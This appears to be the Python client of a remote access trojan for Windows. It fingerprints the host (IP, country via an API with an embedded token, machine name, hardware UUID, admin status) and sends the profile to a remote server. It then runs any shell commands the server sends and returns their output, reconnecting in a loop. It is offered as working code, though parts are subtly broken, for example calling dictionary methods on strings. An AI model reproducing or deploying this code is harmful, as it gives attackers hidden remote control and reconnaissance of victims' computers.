
import socket
import time
import platform
import ctypes
import requests
from wmi import WMI
from .core import create_shell
import json

def check_account_type():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            return "Admin"
        else:
            return "User"
    except Exception:
        return "None"
        
def get_client_info():
    system = platform.system()
    version = platform.version().split('.')[0]
    os = f"{system} {version}"
    response = requests.get('https://ipv4.jsonip.com', timeout=5)
    data = response.json()
    ip = data.get('ip')
    response = requests.get(f'https://api.findip.net/{ip}/?token=000e63e9964845a693b5dcd40dfd6a9d', timeout=5)
    data = response.json()
    country_en = data['country']['names']['en']

    client_info = { "new_client": {
        "IP": ip, 
        "PC Name": platform.node(),  
        "PC ID":  WMI().Win32_ComputerSystemProduct()[0].UUID,
        "OS": os, 
        "Account Type": check_account_type(), 
        "Country": country_en,
        "Tag": "Remote PC",
        }
    }
    return client_info

def start_connection(HOST, PORT):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((HOST, PORT))
            client_info = get_client_info()
            client_socket.sendall(str(client_info).encode('utf-8'))

            while True:
                data = client_socket.recv(1024).decode('utf-8').strip()
                if not data:
                    break
                
                if data.get("terminal") is not None:
                    terminal(data, client_socket)

        except (socket.error, ConnectionResetError):
            time.sleep(1)
        
        finally:
            client_socket.close()


def terminal(data, client_socket):
    shell, stdout_queue, stderr_queue = create_shell()

    if isinstance(data, str):
        try:
            data = json.loads(data)
        except json.JSONDecodeError:
            data = data
    else:
        data = json.dumps(data)
    
    data = data["terminal"]

    shell.stdin.write(data + "\n")
    shell.stdin.flush()

    time.sleep(0.5)
    output = ""

    while not stdout_queue.empty() or not stderr_queue.empty():
        while not stdout_queue.empty():
            output += stdout_queue.get_nowait()
        while not stderr_queue.empty():
            output += stderr_queue.get_nowait()

    client_socket.sendall(output.encode('utf-8') if output else b"Command executed successfully.\n")
    shell.terminate()